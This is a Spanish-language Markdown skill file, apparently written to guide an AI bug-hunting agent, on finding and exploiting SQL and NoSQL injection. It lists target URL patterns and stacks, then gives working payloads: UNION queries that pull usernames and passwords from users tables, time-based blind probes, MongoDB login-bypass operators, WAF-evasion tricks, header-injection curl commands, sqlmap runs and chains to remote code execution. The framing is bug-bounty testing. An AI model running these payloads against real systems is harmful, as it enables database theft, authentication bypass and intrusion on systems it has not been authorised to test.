---
name: hunt-sqli
description: Hunting skill para SQL Injection — error-based, UNION, blind boolean/time, NoSQL operator injection, ORM raw-fragment. Usar cuando el target tiene parámetros que llegan a base de datos. NoSQL dedicado (MongoDB $where/$regex/$ne) tiene su propia lógica acá como contexto adyacente.
sources: elementalsouls/Claude-BugHunter (hunt-sqli), SnailSploit/claude-red (offensive-sqli), hackerone_public, github_security_advisories
---

## Qué es esto y qué NO es

SQLi = input de usuario se interpola en una consulta SQL sin parametrizar. El resultado varía: extracción de datos (UNION / error-based), inferencia char-a-char (blind), bypass de autenticación, o RCE via `xp_cmdshell`/`COPY FROM PROGRAM`.

**No es**: un campo que devuelve error HTTP 500 con `'` pero no produce diferencia semántica. El gate de confirmación lo define.

---

## Conocimiento previo

Use the `hexbrain` skill for relevant public prior art when it can change the test plan; verify any lead against primary sources and target evidence.

---

## Gate de Confirmación — no negociable

Necesitás demostrar al menos uno:
- Extracción de versión/nombre de DB via error o UNION
- Control de delay temporal demostrable (SLEEP(5) vs baseline reproducible)
- Extracción de una fila de `information_schema.tables`
- Bypass de autenticación via condición booleana
- Para NoSQL: bypass de login o extracción de datos de colección

Un cambio de error sin extracción ni timing demostrable = informational.

---

## Elegir la técnica desde la respuesta viva

**No adivines — leé la respuesta.**

- El endpoint **refleja filas** (search, listing, report) → **UNION primero**. Es rápido (~10 requests), los datos aparecen en la respuesta, fácil de probar.
- El endpoint **no refleja datos** → blind boolean/time como último recurso (cientos de requests, nunca aparece el dato en la respuesta).
- Para UNION: el column count es todo. Enumeralo exhaustivamente antes de intentar extraer — un UNION con columnas incorrectas devuelve silenciosamente 0 filas, idéntico a "no vulnerable".

---

## Señales de superficie de ataque

**URL patterns:**
```
/search?q=
/filter?category=
/sort?by=&order=
/report?start_date=&end_date=
/api/v*/items?id=
/gallery?album_id=
/index.php?id=
?page=&limit=&offset=
```

**Headers de respuesta:**
- `X-Powered-By: PHP` + Apache → LAMP stack (MySQL)
- `X-Powered-By: Express` + JSON bodies → posible MongoDB
- Error messages con strings de MySQL/PostgreSQL/MSSQL en respuesta

**Stack signals de alto yield:**
- WordPress con plugins de terceros (`/wp-content/plugins/`)
- Apache Airflow expuesto (`/admin/`, `/api/experimental/`)
- GitHub Enterprise (`/_graphql`, `/search`)
- Subdomains regionales (`.cn`, `.co`) con stacks legacy
- Herramientas internas promovidas a externas

---

## Metodología

### Paso 1 — Confirmar inyección
Enviá `'`, `"`, `` ` `` y observá:
- DB error message en respuesta (confirmación inmediata)
- Cambio en longitud de respuesta
- HTTP 500

### Paso 2 — Determinar tipo por comportamiento de respuesta

**Error-based** → el mensaje de error aparece en la respuesta → extracción directa.

**Boolean blind** → comparar respuestas:
```sql
param=1 AND 1=1--   (true)
param=1 AND 1=2--   (false)
```

**Time-based** (solo si no hay diferencia visible):
```sql
-- MySQL
' AND SLEEP(5)--
-- PostgreSQL
'; SELECT pg_sleep(5)--
-- MSSQL
'; WAITFOR DELAY '0:0:5'--
```

### Paso 3 — UNION: column count primero

```sql
' ORDER BY 1--    ' ORDER BY 2--    (hasta que error)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--     (hasta ~12, no te detengas en 3-4)
```

Cuando no hay error: reemplazá NULLs con markers numéricos para encontrar columnas reflejadas:
```sql
' UNION SELECT 1,2,3,4,5--
```

### Paso 4 — Extracción

```sql
-- Versión y DB
' UNION SELECT 1,version(),database(),4,5--

-- Tablas
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--

-- Datos
' UNION SELECT 1,username,password,4,5 FROM users--
```

### Paso 5 — NoSQL (MongoDB)

```javascript
// JSON body
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Query string
username[$ne]=invalid&password[$ne]=invalid
username[$regex]=.*&password[$regex]=.*
```

---

## Payloads de referencia

**Probes iniciales:**
```sql
'  ''  `  ')  "))  ' OR '1'='1  ' OR 1=1--  admin'--
```

**WAF bypass — keyword obfuscation:**
```sql
SELECT/**/username/**/FROM/**/users
SeLeCt UsErNaMe FrOm UsErS
SE/**/LECT username FR/**/OM users
/*!50000SELECT*/ username FROM users
```

**WAF bypass — encoding:**
```
%27  (URL encode de ')
%2527 (doble encode)
```

**WAF bypass — operators:**
```sql
' || '1'='1    (en vez de OR)
UNION ALL SELECT
```

**Header injection (cuando la URL tiene WAF):**
```bash
curl -H "X-Forwarded-For: 127.0.0.1' AND SLEEP(5)--" https://target.com/
curl -H "User-Agent: test' AND SLEEP(5)--" https://target.com/
```

**Comandos útiles:**
```bash
# Baseline timing
curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test"

# SQLMap básico
sqlmap -u "https://target.com/search?q=test" --dbs --level=3 --risk=2 --batch

# SQLMap con POST
sqlmap -u "https://target.com/api/filter" --data="category=electronics" --dbs --batch

# SQLMap autenticado
sqlmap -u "https://target.com/admin/report" --cookie="session=TOKEN" --dbs --batch --level=5
```

---

## Root causes comunes

1. Concatenación de strings en vez de consultas parametrizadas
2. ORMs usados con fragmentos raw para queries complejas (ORDER BY, GROUP BY)
3. Filtros/sort — los nombres de columna no pueden bindearse, se escapan manualmente y mal
4. Plugins de terceros (WordPress, Joomla) sin auditar
5. Código legacy PHP predating PDO/MySQLi prepared statements
6. "Usamos MongoDB, no hay SQL injection" — operador injection aplica igual

---

## Chains y skills relacionadas

- **`hunt-rce`** — MSSQL con `xp_cmdshell`, PostgreSQL con `COPY FROM PROGRAM 'id'`, MySQL con `INTO OUTFILE` → RCE desde SQLi
- **`idor-bola`** — SQLi da read arbitrario de tabla `users` → extraé IDs/UUIDs → enumeración IDOR masiva confirmada
- **`hunt-auth-bypass`** — `' OR 1=1--` en login, o lectura/inserción en `password_reset_tokens` → ATO sin ver la contraseña original
- **`deserialization-ssti`** — si el target stack es Java con Hibernate, buscar ORM raw-fragment SQLi (JPQL injection)
